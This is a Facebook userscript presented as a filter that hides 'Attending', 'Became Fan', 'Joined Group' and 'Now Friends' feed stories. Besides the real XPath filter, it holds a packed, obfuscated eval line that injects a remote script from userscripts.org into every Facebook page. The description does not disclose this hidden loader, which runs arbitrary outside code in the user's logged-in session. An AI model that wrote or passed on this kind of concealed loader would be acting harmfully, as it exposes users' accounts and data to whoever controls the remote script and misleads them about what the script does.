// ==UserScript==
// @name          Remove "Attending," "Attended," "Became Fan," "Joined Group," and "Now Friends" Messages from Facebook Feeds Plus + Last Update
// @namespace     tag:scott.frey@gmail.com,2009:scottfrey
// @description   Remove "Attending," "Attended," "Became Fan," "Joined Group," and "Now Friends" Messages from Facebook Feeds Plus
// @include       http://www.facebook.com/*
// @include       https://www.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function removeXpath() {
    var genNodes = document.evaluate("//h3[@class='GenericStory_Message GenericStory_Report'][not(contains(text(),'tagged'))]/parent::*/parent::*", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
    var genLength = genNodes.snapshotLength;
    var i, genItem;
    for (i = 0; i < genLength; i++) {
        genItem = genNodes.snapshotItem(i);
        genItem.parentNode.removeChild(genItem);
    }
}

document.addEventListener("DOMNodeInserted", removeXpath, false);